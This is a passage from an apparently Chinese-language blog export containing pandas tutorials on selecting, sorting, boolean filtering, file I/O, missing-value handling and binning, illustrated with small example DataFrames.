<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c4  深圳  <span class="number">102.0</span>  <span class="number">140.9</span>  <span class="number">145.5</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.loc[d.index[:<span class="number">3</span>], [<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;同比&#x27;</span>]]</span><br><span class="line">    城市     同比</span><br><span class="line">c1  北京  <span class="number">120.7</span></span><br><span class="line">c2  上海  <span class="number">127.3</span></span><br><span class="line">c3  广州  <span class="number">119.4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.iloc[:<span class="number">3</span>, d.columns.get_indexer([<span class="string">&#x27;城市&#x27;</span>, <span class="string">&#x27;同比&#x27;</span>])]</span><br><span class="line">    城市     同比</span><br><span class="line">c1  北京  <span class="number">120.7</span></span><br><span class="line">c2  上海  <span class="number">127.3</span></span><br><span class="line">c3  广州  <span class="number">119.4</span></span><br></pre></td></tr></table></figure>


<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><ul>
<li><p>对内容进行排序<code>sort_values</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 默认升序</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.sort_values(by=<span class="string">&#x27;环比&#x27;</span>)</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">c4  深圳  <span class="number">102.0</span>  <span class="number">140.9</span>  <span class="number">145.5</span></span><br><span class="line"><span class="comment"># 指定降序</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.sort_values(by=<span class="string">&#x27;环比&#x27;</span>, ascending=<span class="literal">False</span>)</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c4  深圳  <span class="number">102.0</span>  <span class="number">140.9</span>  <span class="number">145.5</span></span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br><span class="line"><span class="comment"># 多条件排序，先排序&#x27;环比&#x27;，后排序&#x27;同比&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.sort_values(by=[<span class="string">&#x27;环比&#x27;</span>, <span class="string">&#x27;同比&#x27;</span>], ascending=<span class="literal">False</span>)</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c4  深圳  <span class="number">102.0</span>  <span class="number">140.9</span>  <span class="number">145.5</span></span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br></pre></td></tr></table></figure></li>
<li><p>对所有进行排序<code>sort_index</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.sort_index()</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c4  深圳  <span class="number">102.0</span>  <span class="number">140.9</span>  <span class="number">145.5</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.sort_index(ascending=<span class="literal">False</span>)</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br><span class="line">c4  深圳  <span class="number">102.0</span>  <span class="number">140.9</span>  <span class="number">145.5</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h2 id="逻辑运算与布尔索引"><a href="#逻辑运算与布尔索引" class="headerlink" title="逻辑运算与布尔索引"></a>逻辑运算与布尔索引</h2><h3 id="布尔索引"><a href="#布尔索引" class="headerlink" title="布尔索引"></a>布尔索引</h3><p>逻辑运算返回的是一组带索引的布尔值，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br><span class="line"><span class="comment"># &#x27;环比&#x27; &lt; 102</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;环比&#x27;</span>] &lt; <span class="number">102</span></span><br><span class="line">c1     <span class="literal">True</span></span><br><span class="line">c2     <span class="literal">True</span></span><br><span class="line">c3     <span class="literal">True</span></span><br><span class="line">c4    <span class="literal">False</span></span><br><span class="line">c5     <span class="literal">True</span></span><br><span class="line"><span class="comment"># &#x27;环比&#x27; &lt; 102 且 &#x27;同比&#x27; &lt; 120，注意优先级</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>(d[<span class="string">&#x27;环比&#x27;</span>] &lt; <span class="number">102</span>) &amp; (d[<span class="string">&#x27;同比&#x27;</span>] &lt; <span class="number">120</span>)</span><br><span class="line">c1    <span class="literal">False</span></span><br><span class="line">c2    <span class="literal">False</span></span><br><span class="line">c3     <span class="literal">True</span></span><br><span class="line">c4    <span class="literal">False</span></span><br><span class="line">c5     <span class="literal">True</span></span><br><span class="line">dtype: <span class="built_in">bool</span></span><br></pre></td></tr></table></figure>
<p>利用布尔值可以快速筛选出符合条件的数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 筛选出 &#x27;环比&#x27; &lt; 102 的数据</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[d[<span class="string">&#x27;环比&#x27;</span>] &lt; <span class="number">102</span>]</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br><span class="line"><span class="comment"># &#x27;环比&#x27; &lt; 102 且 &#x27;同比&#x27; &lt; 120 的数据</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[(d[<span class="string">&#x27;环比&#x27;</span>] &lt; <span class="number">102</span>) &amp; (d[<span class="string">&#x27;同比&#x27;</span>] &lt; <span class="number">120</span>)]</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br></pre></td></tr></table></figure>


<h3 id="逻辑运算函数"><a href="#逻辑运算函数" class="headerlink" title="逻辑运算函数"></a>逻辑运算函数</h3><ul>
<li><p><code>query(expr)</code>查询符合条件的数据</p>
<ul>
<li><p><code>expr</code>为查询的字符串</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.query(<span class="string">&#x27;环比 &lt; 102 &amp; 同比 &lt; 120&#x27;</span>)</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><code>isin(values)</code>查询一组数中是否存在某些值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">    城市     环比     同比     定基</span><br><span class="line">c1  北京  <span class="number">101.5</span>  <span class="number">120.7</span>  <span class="number">121.4</span></span><br><span class="line">c2  上海  <span class="number">101.2</span>  <span class="number">127.3</span>  <span class="number">127.8</span></span><br><span class="line">c3  广州  <span class="number">101.3</span>  <span class="number">119.4</span>  <span class="number">120.0</span></span><br><span class="line">c4  深圳  <span class="number">102.0</span>  <span class="number">140.9</span>  <span class="number">145.5</span></span><br><span class="line">c5  沈阳  <span class="number">100.1</span>  <span class="number">101.4</span>  <span class="number">101.6</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.isin([<span class="number">101.3</span>, <span class="number">101</span>])</span><br><span class="line">       城市     环比     同比     定基</span><br><span class="line">c1  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line">c2  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line">c3  <span class="literal">False</span>   <span class="literal">True</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line">c4  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line">c5  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
<h2 id="自定义运算"><a href="#自定义运算" class="headerlink" title="自定义运算"></a>自定义运算</h2><p>函数<code>apply(func, axis=0)</code>可以对数据进行自定义运算，运算方式取决去传入参数<code>func</code>，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="string">&#x27;定基&#x27;</span>].apply(<span class="keyword">lambda</span> x:x + <span class="number">10</span>)</span><br><span class="line">c1    <span class="number">131.4</span></span><br><span class="line">c2    <span class="number">137.8</span></span><br><span class="line">c3    <span class="number">130.0</span></span><br><span class="line">c4    <span class="number">155.5</span></span><br><span class="line">c5    <span class="number">111.6</span></span><br><span class="line">Name: 定基, dtype: float64</span><br></pre></td></tr></table></figure>


<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><p>pandas支持多种文件读写操作，详细见官方文档，以下为常用的</p>
<h3 id="CSV"><a href="#CSV" class="headerlink" title="CSV"></a>CSV</h3><ul>
<li><code>pandas.read_csv(filepath_or_buffer, sep=&#39;,&#39;, delimiter=None)</code><ul>
<li><code>filepath_or_buffer</code>：文件路径</li>
<li><code>usecols</code>：指定要读取的<code>columns</code></li>
<li><code>names</code>：读取后设置<code>columns</code>字段值</li>
</ul>
</li>
<li><code>DataFrame.to_csv(path_or_buf=None, columns=None, header=True, index=True, index_label=None, mode=&#39;w&#39;, encoding=None)</code><ul>
<li><code>mode</code>：读写模式</li>
<li><code>index</code>：是否写<code>index</code>索引</li>
<li><code>header</code>：是否写<code>columns</code>索引</li>
</ul>
</li>
</ul>
<h3 id="hdf5"><a href="#hdf5" class="headerlink" title="hdf5"></a>hdf5</h3><p>HDF5文件的读取和存储需要指定一个key，值为要存储的DataFrame</p>
<ul>
<li><code>pandas.read_hdf(path_or_buf, key=None, **kwargs)</code><ul>
<li><code>key</code>：读取的键</li>
<li><code>mode</code>：打开模式</li>
</ul>
</li>
<li><code>DataFrame.to_hdf(path_or_buf, key, **kwargs)</code></li>
</ul>
<h3 id="json"><a href="#json" class="headerlink" title="json"></a>json</h3><ul>
<li><code>pandas.read_json(path_or_buf=None, orient=None, typ=&#39;frame&#39;, lines=False)</code><ul>
<li><code>orient</code>：一般填<code>&quot;records&quot;</code></li>
<li><code>lines</code>：默认按行读取</li>
</ul>
</li>
<li><code>DataFrame.to_json(path_or_buf=None, orient=None, typ=&#39;frame&#39;, lines=False)</code></li>
</ul>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>数据分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Pandas库进阶</title>
    <url>/2021/02/17/Pandas%E5%BA%93%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<p>pandas库进阶</p>
<a id="more"></a>

<h2 id="缺失值NaN"><a href="#缺失值NaN" class="headerlink" title="缺失值NaN"></a>缺失值NaN</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = pd.DataFrame(np.random.randn(<span class="number">5</span>, <span class="number">4</span>))</span><br><span class="line">          <span class="number">0</span>         <span class="number">1</span>         <span class="number">2</span>         <span class="number">3</span></span><br><span class="line"><span class="number">0</span> -<span class="number">0.467109</span>  <span class="number">0.155209</span> -<span class="number">0.352105</span> -<span class="number">0.145243</span></span><br><span class="line"><span class="number">1</span> -<span class="number">1.000026</span> -<span class="number">0.718102</span>  <span class="number">0.492405</span> -<span class="number">0.314355</span></span><br><span class="line"><span class="number">2</span> -<span class="number">0.570243</span>  <span class="number">0.815769</span>  <span class="number">0.675293</span>  <span class="number">0.059136</span></span><br><span class="line"><span class="number">3</span> -<span class="number">1.209361</span>  <span class="number">1.489262</span>  <span class="number">0.977589</span> -<span class="number">0.538479</span></span><br><span class="line"><span class="number">4</span> -<span class="number">0.980784</span>  <span class="number">1.026060</span>  <span class="number">0.021682</span> -<span class="number">0.824890</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[np.random.randint(<span class="number">4</span>)][np.random.randint(<span class="number">5</span>)] = np.NaN</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[np.random.randint(<span class="number">4</span>)][np.random.randint(<span class="number">5</span>)] = np.NaN</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[np.random.randint(<span class="number">4</span>)][np.random.randint(<span class="number">5</span>)] = np.NaN</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[np.random.randint(<span class="number">4</span>)][np.random.randint(<span class="number">5</span>)] = np.NaN</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">          <span class="number">0</span>         <span class="number">1</span>         <span class="number">2</span>         <span class="number">3</span></span><br><span class="line"><span class="number">0</span> -<span class="number">0.467109</span>  <span class="number">0.155209</span> -<span class="number">0.352105</span>       NaN</span><br><span class="line"><span class="number">1</span> -<span class="number">1.000026</span> -<span class="number">0.718102</span>  <span class="number">0.492405</span>       NaN</span><br><span class="line"><span class="number">2</span> -<span class="number">0.570243</span>       NaN  <span class="number">0.675293</span>  <span class="number">0.059136</span></span><br><span class="line"><span class="number">3</span>       NaN  <span class="number">1.489262</span>  <span class="number">0.977589</span> -<span class="number">0.538479</span></span><br><span class="line"><span class="number">4</span> -<span class="number">0.980784</span>  <span class="number">1.026060</span>  <span class="number">0.021682</span> -<span class="number">0.824890</span></span><br></pre></td></tr></table></figure>


<h3 id="判断是否存在NaN"><a href="#判断是否存在NaN" class="headerlink" title="判断是否存在NaN"></a>判断是否存在NaN</h3><p><code>.isnumm()</code>函数可以产一组带索引的布尔值</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.isnull()</span><br><span class="line">       <span class="number">0</span>      <span class="number">1</span>      <span class="number">2</span>      <span class="number">3</span></span><br><span class="line"><span class="number">0</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>   <span class="literal">True</span></span><br><span class="line"><span class="number">1</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>   <span class="literal">True</span></span><br><span class="line"><span class="number">2</span>  <span class="literal">False</span>   <span class="literal">True</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line"><span class="number">3</span>   <span class="literal">True</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line"><span class="number">4</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p><code>.any(axis=0)</code>可查看每一列是否有NaN，<code>.any(axis=1)</code>可查看每一行是否有NaN</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.isnull()</span><br><span class="line">       <span class="number">0</span>      <span class="number">1</span>      <span class="number">2</span>      <span class="number">3</span></span><br><span class="line"><span class="number">0</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>   <span class="literal">True</span></span><br><span class="line"><span class="number">1</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>   <span class="literal">True</span></span><br><span class="line"><span class="number">2</span>  <span class="literal">False</span>   <span class="literal">True</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line"><span class="number">3</span>   <span class="literal">True</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line"><span class="number">4</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span>  <span class="literal">False</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.isnull().<span class="built_in">any</span>(axis=<span class="number">0</span>)</span><br><span class="line"><span class="number">0</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">1</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">2</span>    <span class="literal">False</span></span><br><span class="line"><span class="number">3</span>     <span class="literal">True</span></span><br><span class="line">dtype: <span class="built_in">bool</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.isnull().<span class="built_in">any</span>(axis=<span class="number">1</span>)</span><br><span class="line"><span class="number">0</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">1</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">2</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">3</span>     <span class="literal">True</span></span><br><span class="line"><span class="number">4</span>    <span class="literal">False</span></span><br><span class="line">dtype: <span class="built_in">bool</span></span><br></pre></td></tr></table></figure>
<p>而使用<code>.isnull().values.any()</code>可判断整个数据是否存在NaN</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 判断是否存在NaN</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.isnull().values</span><br><span class="line">array([[<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>,  <span class="literal">True</span>],</span><br><span class="line">       [<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>,  <span class="literal">True</span>],</span><br><span class="line">       [<span class="literal">False</span>,  <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>],</span><br><span class="line">       [ <span class="literal">True</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>],</span><br><span class="line">       [<span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span>]])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.isnull().values.<span class="built_in">any</span>()</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure>


<h3 id="处理NaN及其他标记"><a href="#处理NaN及其他标记" class="headerlink" title="处理NaN及其他标记"></a>处理NaN及其他标记</h3><ul>
<li><p>对于其他标记（例如<code>&#39;?&#39;</code>）可以使用<code>.replace(to_replace, value, inplace=False)</code>函数进行替换</p>
<ul>
<li><code>to_replace</code>：要替换的标记</li>
<li><code>value</code>：替换后的值</li>
<li><code>inplace</code>：是否就地更改</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">          <span class="number">0</span>         <span class="number">1</span>          <span class="number">2</span>          <span class="number">3</span></span><br><span class="line"><span class="number">0</span>       NaN -<span class="number">0.117094</span>   <span class="number">0.201809</span>  <span class="number">0.0936998</span></span><br><span class="line">1         ?  1.166718   0.833323   0.341343</span><br><span class="line"><span class="number">2</span>   <span class="number">2.28867</span>  <span class="number">0.075756</span>     <span class="number">1.3238</span>   <span class="number">0.703166</span></span><br><span class="line"><span class="number">3</span> -<span class="number">0.322933</span>  <span class="number">1.890391</span>        NaN   <span class="number">0.770076</span></span><br><span class="line">4  -0.32468       NaN -0.0308925          ?</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.replace(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">          <span class="number">0</span>         <span class="number">1</span>         <span class="number">2</span>         <span class="number">3</span></span><br><span class="line"><span class="number">0</span>       NaN -<span class="number">0.117094</span>  <span class="number">0.201809</span>  <span class="number">0.093700</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1.000000</span>  <span class="number">1.166718</span>  <span class="number">0.833323</span>  <span class="number">0.341343</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2.288671</span>  <span class="number">0.075756</span>  <span class="number">1.323798</span>  <span class="number">0.703166</span></span><br><span class="line"><span class="number">3</span> -<span class="number">0.322933</span>  <span class="number">1.890391</span>       NaN  <span class="number">0.770076</span></span><br><span class="line"><span class="number">4</span> -<span class="number">0.324680</span>       NaN -<span class="number">0.030892</span>  <span class="number">1.000000</span></span><br></pre></td></tr></table></figure></li>
<li><p>对于NaN，有两种处理方式</p>
<ul>
<li><p><code>.dropna(inplace=False)</code>：去除含有默缺失值NaN的行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.replace(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>)</span><br><span class="line">          <span class="number">0</span>         <span class="number">1</span>         <span class="number">2</span>         <span class="number">3</span></span><br><span class="line"><span class="number">0</span>       NaN -<span class="number">0.117094</span>  <span class="number">0.201809</span>  <span class="number">0.093700</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1.000000</span>  <span class="number">1.166718</span>  <span class="number">0.833323</span>  <span class="number">0.341343</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2.288671</span>  <span class="number">0.075756</span>  <span class="number">1.323798</span>  <span class="number">0.703166</span></span><br><span class="line"><span class="number">3</span> -<span class="number">0.322933</span>  <span class="number">1.890391</span>       NaN  <span class="number">0.770076</span></span><br><span class="line"><span class="number">4</span> -<span class="number">0.324680</span>       NaN -<span class="number">0.030892</span>  <span class="number">1.000000</span></span><br><span class="line"><span class="comment"># 去除含有默缺失值NaN的行</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.replace(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>).dropna()</span><br><span class="line">          <span class="number">0</span>         <span class="number">1</span>         <span class="number">2</span>         <span class="number">3</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1.000000</span>  <span class="number">1.166718</span>  <span class="number">0.833323</span>  <span class="number">0.341343</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2.288671</span>  <span class="number">0.075756</span>  <span class="number">1.323798</span>  <span class="number">0.703166</span></span><br></pre></td></tr></table></figure></li>
<li><p><code>.fillna(value, inplace=False)</code>：将NaN填充为<code>value</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d.replace(<span class="string">&#x27;?&#x27;</span>, <span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">          <span class="number">0</span>         <span class="number">1</span>         <span class="number">2</span>         <span class="number">3</span></span><br><span class="line"><span class="number">0</span>       NaN -<span class="number">0.117094</span>  <span class="number">0.201809</span>  <span class="number">0.093700</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1.000000</span>  <span class="number">1.166718</span>  <span class="number">0.833323</span>  <span class="number">0.341343</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2.288671</span>  <span class="number">0.075756</span>  <span class="number">1.323798</span>  <span class="number">0.703166</span></span><br><span class="line"><span class="number">3</span> -<span class="number">0.322933</span>  <span class="number">1.890391</span>       NaN  <span class="number">0.770076</span></span><br><span class="line"><span class="number">4</span> -<span class="number">0.324680</span>       NaN -<span class="number">0.030892</span>  <span class="number">1.000000</span></span><br><span class="line"><span class="comment"># 替换d[0][0]处的NaN</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d[<span class="number">0</span>].fillna(d[<span class="number">0</span>].mean(), inplace=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">          <span class="number">0</span>         <span class="number">1</span>         <span class="number">2</span>         <span class="number">3</span></span><br><span class="line"><span class="number">0</span>  <span class="number">0.660264</span> -<span class="number">0.117094</span>  <span class="number">0.201809</span>  <span class="number">0.093700</span></span><br><span class="line"><span class="number">1</span>  <span class="number">1.000000</span>  <span class="number">1.166718</span>  <span class="number">0.833323</span>  <span class="number">0.341343</span></span><br><span class="line"><span class="number">2</span>  <span class="number">2.288671</span>  <span class="number">0.075756</span>  <span class="number">1.323798</span>  <span class="number">0.703166</span></span><br><span class="line"><span class="number">3</span> -<span class="number">0.322933</span>  <span class="number">1.890391</span>       NaN  <span class="number">0.770076</span></span><br><span class="line"><span class="number">4</span> -<span class="number">0.324680</span>       NaN -<span class="number">0.030892</span>  <span class="number">1.000000</span></span><br></pre></td></tr></table></figure>


</li>
</ul>
</li>
</ul>
<h2 id="数据离散化"><a href="#数据离散化" class="headerlink" title="数据离散化"></a>数据离散化</h2><p>数据离散化就是将连续的值域划分为若干个离散的区间，用不同的符号或数值代表每个区间中的属性</p>
<h3 id="分组"><a href="#分组" class="headerlink" title="分组"></a>分组</h3><ul>
<li><p>自动分组<code>pandas.qcut(data, bins)</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>d</span><br><span class="line">             A          B           C           D</span><br><span class="line">c0   -<span class="number">5.011405</span>  <span class="number">51.598027</span>   <span class="number">30.736787</span> -<span class="number">155.574060</span></span><br><span class="line">c1  <span class="number">103.312304</span> -<span class="number">40.163837</span> -<span class="number">125.380597</span> -<span class="number">149.740251</span></span><br><span class="line">c2  -<span class="number">44.149836</span>  <span class="number">40.952584</span>   <span class="number">22.689684</span>  -<span class="number">59.907136</span></span><br><span class="line">c3  <span class="number">115.680639</span>  -<span class="number">7.897926</span>   <span class="number">78.096531</span>   <span class="number">14.463511</span></span><br><span class="line">c4   <span class="number">32.387194</span> -<span class="number">16.200097</span>   <span class="number">57.731634</span>   <span class="number">42.056148</span></span><br><span class="line"><span class="comment"># 对d[&#x27;C&#x27;]进行分组，分为5组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pd.qcut(d[<span class="string">&#x27;C&#x27;</span>], <span class="number">5</span>)</span><br><span class="line">c0      (<span class="number">27.518</span>, <span class="number">41.535</span>]</span><br><span class="line">c1    (-<span class="number">125.382</span>, -<span class="number">6.924</span>]</span><br><span class="line">c2      (-<span class="number">6.924</span>, <span class="number">27.518</span>]</span><br><span class="line">c3      (<span class="number">61.805</span>, <span class="number">78.097</span>]</span><br><span class="line">c4      (<span class="number">41.535</span>, <span class="number">61.805</span>]</span><br><span class="line">Name: C, dtype: category</span><br><span class="line">Categories (<span class="number">5</span>, interval[float64]): [(-<span class="number">125.382</span>, -<span class="number">6.924</span>] &lt; (-<span class="number">6.924</span>, <span class="number">27.518</span>] &lt; (<span class="number">27.518</span>, <span class="number">41.535</span>] &lt;</span><br><span class="line">                                    (<span class="number">41.535</span>, <span class="number">61.805</span>] &lt; (<span class="number">61.805</span>, <span class="number">78.097</span>]]</span><br></pre></td></tr></table></figure></li>
<li><p>自定义分组<code>pandas.cut(data, bins)</code></p>
